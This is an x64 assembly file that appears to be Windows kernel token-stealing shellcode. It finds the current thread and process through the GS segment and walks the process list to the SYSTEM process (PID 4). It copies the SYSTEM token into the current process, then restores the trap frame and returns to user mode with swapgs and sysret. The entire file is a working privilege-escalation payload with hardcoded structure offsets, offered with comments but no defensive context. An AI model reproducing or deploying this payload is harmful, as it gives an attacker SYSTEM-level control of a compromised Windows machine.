[BITS 64]

_start:
  mov rax, [gs:0x188]         ; Current thread
  mov rax, [rax + 0xb8]       ; Current process
  mov r12, rax                ; Store current process (_EPROCESS) to R12
  
__loop:
  mov r12, [r12 + 0x448]      ; ActiveProcessLinks
  sub r12, 0x448              ; Go back to current process (_EPROCESS)
  mov r13, [r12 + 0x440]      ; UniqueProcessId (PID)
  cmp r13, 4                  ; Compare PID to SYSTEM PID
  jnz __loop                  ; Loop until SYSTEM PID is found

replace:
  mov r13, [r12 + 0x4b8]      ; Get SYSTEM token
  and r13, 0xfffffffffffffff0 ; Clear low 4 bits of _EX_FAST_REF structure
  mov [rax + 0x4b8], r13      ; Copy SYSTEM token to current process

cleanup:
  mov rax, [gs:0x188]
  mov cx, [rax + 0x1e4]
  inc cx
  mov [rax + 0x1e4], cx

  mov rdx, [rax + 0x90]
  mov rcx, [rdx + 0x168]
  mov r11, [rdx + 0x178]
  mov rsp, [rdx + 0x180]
  mov rbp, [rdx + 0x158]

  xor eax, eax
  swapgs
  o64 sysret